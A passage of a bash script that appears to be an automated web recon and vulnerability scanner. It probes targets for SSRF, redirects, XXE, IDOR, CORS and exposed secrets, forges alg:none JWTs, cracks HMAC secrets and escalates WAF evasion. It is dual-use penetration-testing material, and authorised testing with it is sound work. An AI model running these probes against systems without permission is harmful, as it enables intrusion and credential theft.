    (( bl>0 && l > bl*3 && l > 500 )) && { fnd low soft ssrf "$u" "$p" "${bl}B→${l}B"; break; }
  done; done; }

m_redirect() { local u="$1" p
  for p in $(params_of "$u"); do for pl in "${P_REDIR[@]}"; do
    local m; m=$(mutate "$u" "$p" "$pl") || continue; req "$m" >/dev/null
    grep -qiE '^location:.*(evil\.com|google\.com)' "$HDR" 2>/dev/null && {
      fnd medium firm redirect "$u" "$p" "$(grep -i '^location:' "$HDR" | tr -d '\r' | cut -c1-78)"; break; }
  done; done; }

m_crlf() { local u="$1" p
  for p in $(params_of "$u"); do for pl in "${P_CRLF[@]}"; do
    local m; m=$(mutate "$u" "$p" "$pl") || continue; req "$m" >/dev/null
    grep -qiE '^Reconic: ?1' "$HDR" 2>/dev/null && { fnd medium firm crlf "$u" "$p" "header injected"; break; }
  done; done; }

m_xxe() { local u="$1" p
  for p in $(params_of "$u"); do for pl in "${P_XXE[@]}"; do
    local real="$pl"
    [[ "$pl" == *TOKEN.OAST* ]] && { [[ -z "$OOB_DOMAIN" ]] && continue
      local tk; tk=$(oob_tok); oob_map "$tk" xxe "$u" "$p"; real="${pl//TOKEN/$tk}"; }
    local m; m=$(mutate "$u" "$p" "$(enc "$EVADE" "$real")") || continue
    req "$m" -H 'Content-Type: application/xml' >/dev/null
    grep -qE 'root:.*:0:0:|PD9waHA' "$BODY" 2>/dev/null && { fnd critical firm xxe "$u" "$p" "entity expanded"; break; }
  done; done; }

m_idor() { local u="$1" p
  for p in $(params_of "$u"); do
    local v="${u#*"$p="}"; v="${v%%&*}"
    [[ "$v" =~ ^[0-9]{1,9}$ ]] || continue
    local a b; a=$(mutate "$u" "$p" "$v") || continue; b=$(mutate "$u" "$p" "$((v+1))") || continue
    req "$a" >/dev/null; local ca="$CODE" la; la=$(wc -c <"$BODY")
    req "$b" >/dev/null; local cb="$CODE" lb; lb=$(wc -c <"$BODY")
    (( ca==200 && cb==200 && la>200 )) || continue
    local d=$(( la>lb ? la-lb : lb-la ))
    (( d > la/5 )) && fnd low probable idor "$u" "$p" "id ${v}→$((v+1)) ${la}B→${lb}B"
  done; }

m_jwt() { local u="$1" tok
  tok=$(grep -hoE 'eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{4,}' "$SRC" 2>/dev/null | head -1)
  [[ -z "$tok" ]] && return 0
  local h pl none; h=$(cut -d. -f1 <<<"$tok"); pl=$(cut -d. -f2 <<<"$tok")
  none="$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=').${pl}."
  req "$u" -H "Authorization: Bearer $none" >/dev/null
  [[ "$CODE" =~ ^2 ]] && fnd high probable jwt "$u" "-" "alg:none accepted"
  local wl="$HOME/.reconic/wordlists/pass.txt"
  [[ -s "$wl" ]] || return 0
  local sec; sec=$(python3 - "$h" "$pl" "$tok" "$wl" <<'PY' 2>/dev/null
import sys,hmac,hashlib,base64
h,p,t,w=sys.argv[1:5]
d=lambda x: base64.urlsafe_b64decode(x+'='*(-len(x)%4))
raw=d(h)+b'.'+d(p); want=d(t.split('.')[2])
for l in open(w,'rb'):
    k=l.strip()
    if hmac.compare_digest(hmac.new(k,raw,hashlib.sha256).digest(),want): print(k.decode()); break
PY
)
  [[ -n "$sec" ]] && fnd high firm jwt "$u" "-" "hmac secret: $sec"; }

# ── host modules ────────────────────────────────────────────────────────
m_exposure() {
  local host="$1" bogus="${host%/}/.rcn-$RANDOM" sfl
  curl -sS -m 10 -k -A "$(ua)" -o "$WORK/sf" -w '' "$bogus" >/dev/null 2>&1
  sfl=$(wc -c <"$WORK/sf" 2>/dev/null || echo 0)
  local list=(".git/HEAD|ref: refs/heads" ".git/config|[core]" ".env|APP_KEY=|DB_PASSWORD="
    ".svn/entries|dir" ".DS_Store|Bud1" "composer.json|\"require\"" "package.json|\"dependencies\""
    "swagger-ui.html|swagger" "swagger.json|openapi" "v2/api-docs|swagger" "openapi.json|openapi"
    "actuator|_links" "actuator/env|propertySources" "actuator/heapdump|JAVA PROFILE"
    "server-status|Apache Server Status" "phpinfo.php|PHP Version" "info.php|PHP Version"
    ".well-known/security.txt|Contact:" "web.config|configuration" "config.php.bak|<?php"
    "backup.zip|PK" "db.sql|CREATE TABLE" "graphql|__schema" "robots.txt|Disallow"
    ".htaccess|RewriteEngine" "sitemap.xml|<urlset" ".git/logs/HEAD|clone" "wp-config.php.bak|DB_NAME")
  local e p sig url code len
  for e in "${list[@]}"; do
    p="${e%%|*}"; sig="${e##*|}"; url="${host%/}/$p"
    code=$(curl -sS -m 10 -k -A "$(ua)" -o "$WORK/x" -w '%{http_code}' "$url" 2>/dev/null) || continue
    [[ "$code" =~ ^(200|401|403)$ ]] || continue
    len=$(wc -c <"$WORK/x" 2>/dev/null || echo 0)
    grep -qiF -- "$sig" "$WORK/x" 2>/dev/null || continue
    (( sfl>0 && len>sfl-25 && len<sfl+25 )) && continue
    local sev=medium
    [[ "$p" == .env || "$p" == *.bak || "$p" == db.sql || "$p" == backup.zip ]] && sev=high
    [[ "$p" == .git/HEAD || "$p" == actuator/heapdump || "$p" == .git/config ]] && sev=critical
    fnd "$sev" firm exposure "$url" "-" "$p → '$sig' (${len}B)"
  done; }

m_cors() { local host="$1" hdr
  hdr=$(curl -sS -m 10 -k -o /dev/null -D - -A "$(ua)" -H 'Origin: https://rcn.evil' "$host" 2>/dev/null)
  if grep -qi 'access-control-allow-credentials: true' <<<"$hdr" && grep -qi 'access-control-allow-origin: https://rcn.evil' <<<"$hdr"; then
    fnd high firm cors "$host" "-" "origin reflected + credentials"
  elif grep -qi 'access-control-allow-origin: \*' <<<"$hdr"; then fnd low soft cors "$host" "-" "wildcard origin"; fi
  hdr=$(curl -sS -m 10 -k -o /dev/null -D - -A "$(ua)" -H 'Origin: null' "$host" 2>/dev/null)
  grep -qi 'access-control-allow-origin: null' <<<"$hdr" && fnd low soft cors "$host" "-" "null origin accepted"; }

m_hosthdr() { local host="$1" can="rcn${RANDOM}.evil"
  req "$host" -H "Host: $can" >/dev/null; grep -qF "$can" "$BODY" 2>/dev/null && fnd low probable hosthdr "$host" "Host" "reflected"
  req "$host" -H "X-Forwarded-Host: $can" >/dev/null; grep -qF "$can" "$BODY" 2>/dev/null && fnd low probable hosthdr "$host" "XFH" "reflected"; }

m_takeover() { local host="$1" cn body h="${host#http*://}"
  cn=$(dig +short CNAME "$h" 2>/dev/null | head -1); [[ -z "$cn" ]] && return 0
  local fps=("s3.amazonaws.com|NoSuchBucket" "github.io|There isn't a GitHub Pages site here"
    "herokuapp.com|No such app" "cloudfront.net|Bad request" "azurewebsites.net|404 Web Site not found"
    "trafficmanager.net|page not found" "wordpress.com|doesn't exist" "desk.com|Sorry, we couldn"
    "pantheon.io|404 Unknown site" "surge.sh|project not found" "bitbucket.io|Repository not found"
    "readme.io|Project doesnt exist" "ghost.io|Domain error" "zendesk.com|Help Center Closed")
  body=$(curl -sS -m 10 -k -A "$(ua)" "$host" 2>/dev/null | head -c 8000)
  local f; for f in "${fps[@]}"; do
    [[ "$cn" == *"${f%%|*}"* ]] || continue
    grep -qiF -- "${f##*|}" <<<"$body" && { fnd high firm takeover "$host" "-" "dangling $cn"; return 0; }
  done; }

m_tls() { local host="$1"; have tlsx || return 0
  local o; o=$(echo "${host#http*://}" | tlsx -silent -expired -self-signed -mismatched 2>/dev/null)
  [[ -z "$o" ]] && return 0
  grep -qi expired <<<"$o" && fnd medium firm tls "$host" "-" "expired cert"
  grep -qi 'self.signed' <<<"$o" && fnd medium firm tls "$host" "-" "self-signed cert"; }

# ── dir / vhost / fuzz ──────────────────────────────────────────────────
wl() { [[ -n "$WORDLIST" && -s "$WORDLIST" ]] && { printf '%s' "$WORDLIST"; return; }
  local d="$HOME/.reconic/wordlists"; printf '%s' "$d/${1:-dir}.txt"; }

m_dir() { local host="$1" w; w=$(wl dir); have ffuf || return 0; [[ -s "$w" ]] || return 0
  local j="$WORK/f.json"
  ffuf -u "${host%/}/FUZZ" -w "$w" -t "$CONC" -rate "$RATE" -timeout 10 -ac \
    -mc 200,204,301,302,307,401,403 -e .php,.bak,.old,.txt,.zip,.sql,.json,.xml,.yml,.env,.log,.swp \
    -of json -o "$j" -s >/dev/null 2>&1
  [[ -s "$j" ]] || return 0
  jq -r '.results[]? | "\(.status)\t\(.length)\t\(.url)"' "$j" 2>/dev/null | while IFS=$'\t' read -r st ln url; do
    local sev=low
    [[ "$url" =~ \.(env|bak|sql|zip|old|swp|log)$ ]] && sev=medium
    [[ "$url" =~ \.git ]] && sev=high
    fnd "$sev" probable exposure "$url" "-" "ffuf $st ${ln}B"
  done; }

m_vhost() { local host="$1" w base dom j="$WORK/v.json"
  have ffuf || return 0; w=$(wl vhost); [[ -s "$w" ]] || return 0
  dom=$(echo "$host" | awk -F/ '{print $3}' | sed 's/^www\.//')
  base="${host%/}/"
  local bl; bl=$(curl -sS -m 10 -k -A "$(ua)" -o "$WORK/vb" -w '%{size_download}' "$base" 2>/dev/null); bl=${bl:-0}
  local extra=(); (( bl > 0 )) && extra=(-fs "$bl")
  ffuf -u "$base" -H "Host: FUZZ.$dom" -w "$w" -t "$CONC" -rate "$RATE" -timeout 10 \
    "${extra[@]}" -mc 200,301,302,401,403 -of json -o "$j" -s >/dev/null 2>&1
  [[ -s "$j" ]] || return 0
  jq -r '.results[]? | "\(.status)\t\(.length)\t\(.input.FUZZ)"' "$j" 2>/dev/null | while IFS=$'\t' read -r st ln fq; do
    local cand="http://$fq.$dom/"
    local cl; cl=$(curl -sS -m 10 -k -A "$(ua)" -H "Host: $fq.$dom" -o "$WORK/vc" -w '%{size_download}' "$base" 2>/dev/null)
    (( ${cl:-0} == ${bl:-0} )) && continue
    local title; title=$(grep -oiE '<title>[^<]{0,60}' "$WORK/vc" 2>/dev/null | head -1 | sed 's/<title>//')
    fnd medium firm vhost "$cand" "-" "vhost $fq.$dom → $st ${cl}B ${title}"
  done; }

m_fuzz() { local u="$1" p; have ffuf || return 0
  for p in $(params_of "$u"); do
    local tpl; tpl=$(mutate "$u" "$p" "FUZZ") || continue
    local hit; hit=$(ffuf -u "$tpl" -w <(printf '%s\n' "${P_SQLI[@]:0:30}") -t 8 -rate "$RATE" -ac -s \
      -mr "$SQL_ERR" -of json 2>/dev/null | jq -r '.results[]?.input.FUZZ' 2>/dev/null | head -1)
    [[ -n "$hit" ]] && fnd medium probable fuzz "$u" "$p" "ffuf match $(cut -c1-36 <<<"$hit")"
  done; }

# ── worker ──────────────────────────────────────────────────────────────
worker() { local mod="$1"; FIND="$2"; SRC="$3"; OOB_DOMAIN="$4"; local u="$5"
  setup; export OOB_DOMAIN
  case "$mod" in
    xss) m_xss "$u";; sqli) m_sqli "$u";; lfi) m_lfi "$u";; rce) m_rce "$u";;
    ssti) m_ssti "$u";; ssrf) m_ssrf "$u";; redirect) m_redirect "$u";;
    crlf) m_crlf "$u";; idor) m_idor "$u";; jwt) m_jwt "$u";; xxe) m_xxe "$u";;
    exposure) m_exposure "$u";; cors) m_cors "$u";; hosthdr) m_hosthdr "$u";;
    takeover) m_takeover "$u";; tls) m_tls "$u";; dir) m_dir "$u";;
    vhost) m_vhost "$u";; fuzz) m_fuzz "$u";;
  esac; }

runmod() { local mod="$1" inf="$2" f="$3"; [[ -s "$inf" ]] || return 0
  local n; n=$(wc -l <"$inf" | tr -d ' ')
  (( n > 3000 )) && head -n 3000 "$inf" > "$inf.c" && inf="$inf.c"
  info "$mod $(bar 100) $n"
  xargs -P "$CONC" -d '\n' -I{} "$SELF" __worker "$mod" "$f" "$inf" "$OOB_DOMAIN" -- {} <"$inf" 2>/dev/null
  local c; c=$(grep -cF "$(printf '\t')$mod$(printf '\t')" "$f" 2>/dev/null || echo 0)
  ok "$mod → $c"; }

# ── recon ───────────────────────────────────────────────────────────────
waf_detect() { local h; h=$(curl -sS -m 10 -k -o /dev/null -D - -A "$(ua)" "$1" 2>/dev/null)
  local s='cloudflare|akamai|imperva|incapsula|sucuri|awselb|awswaf|barracuda|big-ip|fastly|stackpath|wallarm'
  grep -qiE "$s" <<<"$h" && { grep -oiE "$s" <<<"$h" | head -1; return 0; }; return 1; }

phase() { PH=$((PH+1)); rule
  printf '%s%s%02d / %02d%s  %s%s%s\n' "$B" "$M" "$PH" "$PH_TOTAL" "$R" "$B" "$1" "$R"; }

scope_filter() { local f="$1"
  [[ -n "$SCOPE" && -s "$f" ]] && grep -E "$SCOPE" -i "$f" > "$f.s" 2>/dev/null && mv "$f.s" "$f"
  [[ -n "$EXCLUDE" && -s "$f" ]] && grep -vE "$EXCLUDE" -i "$f" > "$f.e" 2>/dev/null && mv "$f.e" "$f"; }

spine() {
  local d="$1" o="$2"
  phase "PASSIVE ENUMERATION"
  { have subfinder && subfinder -d "$d" -all -silent 2>/dev/null
    have assetfinder && assetfinder --subs-only "$d" 2>/dev/null
    curl -fsSL -m 40 "https://crt.sh/?q=%25.${d}&output=json" 2>/dev/null | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g'
    curl -fsSL -m 25 "https://otx.alienvault.com/api/v1/indicators/domain/${d}/passive_dns" 2>/dev/null | jq -r '.passive_dns[]?.hostname'
  } | sed '/^$/d' | grep -iE "(^|\.)${d//./\\.}$" | sort -u > "$o/subs.txt"
  echo "$d" >>"$o/subs.txt"; sort -u -o "$o/subs.txt" "$o/subs.txt"
  ok "subdomains $(bar 100) $(wc -l <"$o/subs.txt" | tr -d ' ')"

  phase "SUBDOMAIN BRUTE"
  if ((DO_SUBBRUTE)); then
    local w; w=$(wl dns)
    if [[ -s "$w" ]] && have dnsx; then
      dnsx -d "$d" -w "$w" -silent -a -resp-only -t "$CONC" 2>/dev/null | sort -u >> "$o/subs.txt"
      sort -u -o "$o/subs.txt" "$o/subs.txt"
    else warn "no dns wordlist or dnsx — skipped"; fi
  fi
  ok "total subs $(bar 100) $(wc -l <"$o/subs.txt" | tr -d ' ')"

  phase "DNS RESOLUTION"
  : > "$o/resolved.txt"
  have dnsx && dnsx -l "$o/subs.txt" -silent -a -cname -resp 2>/dev/null \
    | grep -oE '^[a-zA-Z0-9._-]+' | sort -u > "$o/resolved.txt"
  # apex must always survive, even when DNS is flaky
  grep -qxF "$d" "$o/resolved.txt" 2>/dev/null || echo "$d" >> "$o/resolved.txt"
  [[ -s "$o/resolved.txt" ]] || cp "$o/subs.txt" "$o/resolved.txt"
  scope_filter "$o/resolved.txt"
  ok "resolved $(bar 100) $(wc -l <"$o/resolved.txt" | tr -d ' ')"

  phase "HTTP PROBE & FINGERPRINT"
  : > "$o/http.jsonl"; : > "$o/live.txt"
  httpx -l "$o/resolved.txt" -silent -threads "$CONC" -rate-limit "$RATE" -status-code -title \
    -tech-detect -web-server -cdn -cname -follow-redirects -timeout 10 -retries 2 -no-color \
    -json 2>"$o/httpx.err" > "$o/http.jsonl" || true
  jq -r '.url' "$o/http.jsonl" 2>/dev/null | sort -u > "$o/live.txt"

  if [[ ! -s "$o/live.txt" ]]; then
    warn "json probe empty — retrying plain output"
    httpx -l "$o/resolved.txt" -silent -threads "$CONC" -timeout 10 -no-color \
      2>>"$o/httpx.err" | grep -E '^https?://' | sort -u > "$o/live.txt" || true
  fi
  if [[ ! -s "$o/live.txt" ]]; then
    warn "no live hosts — falling back to resolved list"
    cp "$o/resolved.txt" "$o/live.txt"
  fi

  jq -r 'select(.tech!=null)|"\(.url)  \(.tech|join(","))"' "$o/http.jsonl" 2>/dev/null > "$o/fingerprint.txt"
  jq -r '.tech[]?' "$o/http.jsonl" 2>/dev/null | sort -u > "$o/tech.txt"
  jq -r 'select(.status_code>=200 and .status_code<300)|.url' "$o/http.jsonl" 2>/dev/null | sort -u > "$o/live2xx.txt"
  ok "live $(bar 100) $(wc -l <"$o/live.txt" | tr -d ' ')"
  ((DEBUG)) && [[ -s "$o/httpx.err" ]] && { warn "httpx stderr:"; head -5 "$o/httpx.err"; }

  local wf; wf=$(waf_detect "$(head -1 "$o/live.txt")") && {
    warn "WAF: $wf — evasion→2"; ((EVADE<2)) && EVADE=2; echo "$wf" > "$o/waf.txt"; }

  phase "CRAWL & URL COLLECTION"
  if ((DO_CRAWL)); then
    { have gau && timeout 500 gau --threads "$CONC" --subs "$d" 2>/dev/null
      have waybackurls && timeout 240 waybackurls "$d" 2>/dev/null
      curl -fsSL -m 90 "http://web.archive.org/cdx/search/cdx?url=*.${d}/*&output=txt&fl=original&collapse=urlkey&limit=40000" 2>/dev/null
      have katana && timeout 700 katana -list "$o/live.txt" -d 3 -silent -c "$CONC" -rl "$RATE" -jc -kf all 2>/dev/null
    } | grep -E '^https?://' | sort -u | head -n "$MAXURLS" > "$o/urls.txt"
  else grep -E '^https?://' "$o/live.txt" | sort -u > "$o/urls.txt"; fi
  scope_filter "$o/urls.txt"
  grep -E '\?[^#=]+=[^#&]' "$o/urls.txt" | sort -u > "$o/param_urls.txt"
  ok "urls $(bar 100) $(wc -l <"$o/urls.txt" | tr -d ' ') · param $(wc -l <"$o/param_urls.txt" | tr -d ' ')"
}

# ── diff ────────────────────────────────────────────────────────────────
diff_runs() {
  local old="$1" new="$2" out="$3"
  mkdir -p "$out"
  local f
  for f in subs.txt resolved.txt live.txt urls.txt param_urls.txt; do
    [[ -f "$old/$f" ]] || continue
    comm -13 <(sort -u "$old/$f") <(sort -u "$new/$f" 2>/dev/null) > "$out/new_$f"
    comm -23 <(sort -u "$old/$f") <(sort -u "$new/$f" 2>/dev/null) > "$out/gone_$f"
  done
  ok "diff: $(cat "$out"/new_*.txt 2>/dev/null | wc -l) new / $(cat "$out"/gone_*.txt 2>/dev/null | wc -l) gone → $out"
  [[ -s "$out/new_urls.txt" ]] && while IFS= read -r u; do
    printf 'medium\tfirm\tnew-endpoint\t%s\t-\tappeared since last run\n' "$u" >> "$out/findings.tsv"
  done < <(grep -E '\?[^#=]+=' "$out/new_urls.txt" 2>/dev/null)
  [[ -s "$out/new_live.txt" ]] && while IFS= read -r u; do
    printf 'medium\tfirm\tnew-host\t%s\t-\tappeared since last run\n' "$u" >> "$out/findings.tsv"
  done < "$out/new_live.txt"
}

cmd_diff() {
  [[ -z "${OLD:-}" || -z "${NEW:-}" ]] && die "usage: $(basename "$0") diff <old-dir> <new-dir>"
  [[ -d "$OLD" && -d "$NEW" ]] || die "both directories must exist"
  banner; rule; info "diff $OLD → $NEW"; rule
  diff_runs "$OLD" "$NEW" "./reconic-diff-$(date +%Y%m%d-%H%M%S)"
}

triage() { local o="$1" raw="$o/findings.tsv" out="$o/findings.txt"
  [[ -s "$raw" ]] || { : >"$out"; return 0; }
  awk -F'\t' -v m="$MINSEV" 'BEGIN{split("info low medium high critical",a," ");for(i=1;i<=5;i++)w[a[i]]=i;f=w[m]} w[$1]>=f' \
    "$raw" | sort -u | sort -t$'\t' -k1,1r -k3,3 > "$out"; }

report() {
  local d="$1" o="$2" r="$o/REPORT.md"
  local c h m l
  c=$(grep -c '^critical' "$o/findings.txt" 2>/dev/null||true); h=$(grep -c '^high' "$o/findings.txt" 2>/dev/null||true)
  m=$(grep -c '^medium' "$o/findings.txt" 2>/dev/null||true); l=$(grep -c '^low' "$o/findings.txt" 2>/dev/null||true)
  { printf '# Reconic — %s\n\n`%s` · profile `%s` · evasion `%s` · oob `%s`\n\n' "$d" "$(date -Is)" "$PROFILE" "$EVADE" "${OOB_DOMAIN:-off}"
    printf '| critical | high | medium | low |\n|---:|---:|---:|---:|\n| %s | %s | %s | %s |\n\n' "$c" "$h" "$m" "$l"
    if [[ -s "$o/findings.txt" ]]; then
      printf '| sev | conf | type | url | param | evidence |\n|---|---|---|---|---|---|\n'
      awk -F'\t' '{gsub(/\|/,"\\|");printf "| %s | %s | %s | %s | %s | %s |\n",$1,$2,$3,$4,$5,$6}' "$o/findings.txt" | head -500
    else printf '_nothing above the severity floor_\n'; fi
    printf '\n## surface\n\n'; for f in subs resolved live urls param_urls; do
      printf -- '- %s: %s\n' "$f" "$(wc -l <"$o/$f.txt" 2>/dev/null|tr -d ' ')"; done
  } >"$r"; }

# ── driver ──────────────────────────────────────────────────────────────
one() {
  local d="$1" o="$OUT/$d"; mkdir -p "$o"
  STEPLOG="$LOGDIR/$d.log"; : >"$STEPLOG"
  [[ -f "$o/.done" ]] && ((RESUME)) && { ok "$d cached"; return 0; }
  rule; printf '%s%s▸ %s%s\n' "$B" "$G" "$d" "$R"; local t0=$SECONDS; PH=0

  spine "$d" "$o" || { warn "$d dead surface"; touch "$o/.done"; return 0; }

  local F="$o/findings.tsv"; : >"$F"
  local hp="$ALL_HOST" pp="$ALL_PARAM"
  [[ -n "$MODULES" ]] && { hp=""; pp=""; for m in $MODULES; do [[ " $ALL_HOST " == *" $m "* ]] && hp+="$m " || pp+="$m "; done; }
  for m in $SKIP; do hp="${hp// $m / }"; pp="${pp// $m / }"; done
  ((DO_DIR)) && hp+="dir "; ((DO_VHOST)) && hp+="vhost "; ((DO_FUZZ)) && pp+="fuzz "

  phase "ACTIVE DETECTION"
  for m in $pp; do runmod "$m" "$o/param_urls.txt" "$F"; done
  for m in $hp; do runmod "$m" "$o/live.txt" "$F"; done

  if ((OOB)) && [[ -n "$OOB_DOMAIN" ]]; then
    phase "OOB CORRELATION"; local i
    for i in $(seq 1 "$OOB_TIMEOUT"); do info "wait $(bar $((i*100/OOB_TIMEOUT)))"; sleep 1; done
    oob_poll; fi

  if ((DO_NUCLEI)) && have nuclei && [[ -s "$o/live.txt" ]]; then
    phase "NUCLEI CORROBORATION"
    nuclei -l "$o/live.txt" -silent -no-color -c "$CONC" -rl "$RATE" -severity critical,high \
      -etags dos,fuzz -timeout 10 -o "$o/nuclei.txt" >/dev/null 2>&1
    awk -F'\t' '{print "high\tfirm\tnuclei\t"$0}' "$o/nuclei.txt" 2>/dev/null >>"$F"; fi

  if [[ -n "$DIFF_BASE" ]]; then
    phase "DIFF"
    if [[ -d "$DIFF_BASE/$d" ]]; then diff_runs "$DIFF_BASE/$d" "$o" "$o/diff"
      cat "$o/diff/findings.tsv" 2>/dev/null >>"$F"
    else warn "no baseline at $DIFF_BASE/$d"; fi; fi

  triage "$o"; report "$d" "$o"
  ((JSONL)) && awk -F'\t' '{printf "{\"sev\":\"%s\",\"conf\":\"%s\",\"type\":\"%s\",\"url\":\"%s\",\"param\":\"%s\"}\n",$1,$2,$3,$4,$5}' "$o/findings.txt" > "$o/findings.jsonl"
  touch "$o/.done"
  ok "$d · $((SECONDS-t0))s · $(wc -l <"$o/findings.txt"|tr -d ' ') finding(s)"; }

preflight() {
  [[ ${#TARGETS[@]} -eq 0 ]] && { usage; die "no targets"; }
  local c=()
  for t in "${TARGETS[@]}"; do t="${t%%#*}"; t="${t//[[:space:]]/}"; [[ -z "$t" ]] && continue
    t="${t#http://}"; t="${t#https://}"; t="${t%%/*}"; c+=("$t"); done
  mapfile -t TARGETS < <(printf '%s\n' "${c[@]}" | sed '/^$/d' | sort -u)
  [[ ${#TARGETS[@]} -eq 0 ]] && die "no valid targets"
  OUT="${OUT:-./reconic-out}"; mkdir -p "$OUT"; LOGDIR="$OUT/_logs"; mkdir -p "$LOGDIR"
  STEPLOG="$LOGDIR/run.log"; : >"$STEPLOG"
  # awk: parenthesised ternary — bare > would parse as redirection
  THROTTLE=$(awk -v t="$CONC" -v r="$RATE" 'BEGIN{ if (r>0) printf "%.3f\n", (t/r); else print "0" }')
  have curl || die "curl missing"; have jq || die "jq missing"; have httpx || die "httpx missing"
  [[ -n "$WORDLIST" && ! -s "$WORDLIST" ]] && warn "wordlist not found: $WORDLIST"
  ((PASSIVE)) && { DO_NUCLEI=0; DO_CRAWL=0; }
  info "${#TARGETS[@]} target(s) · $PROFILE · ${CONC}x · ${RATE}rps · evade $EVADE"; }

main() {
  [[ "${1:-}" == "__worker" ]] && { shift; worker "$2" "$3" "$4" "$5" "$7"; exit 0; }
  parse "$@"
  case "$CMD" in
    help) usage; exit 0 ;;  version) echo "reconic $VERSION — $AUTHOR"; exit 0 ;;
    install) do_install; exit 0 ;;  verify) do_verify; exit 0 ;;
    update) for t in "${!GOT[@]}"; do inst1 "$t" "${GOT[$t]}"; done; exit 0 ;;
    diff) cmd_diff; exit 0 ;;
  esac
  banner; preflight; oob_start
  trap 'oob_stop; err "interrupted"; exit 130' INT TERM
  local t0=$SECONDS
  for d in "${TARGETS[@]}"; do one "$d"; done
  oob_stop; rule
  printf '%s%sCOMPLETE%s · %ss · %s\n' "$B" "$G" "$R" "$((SECONDS-t0))" "$OUT"; }

main "$@"
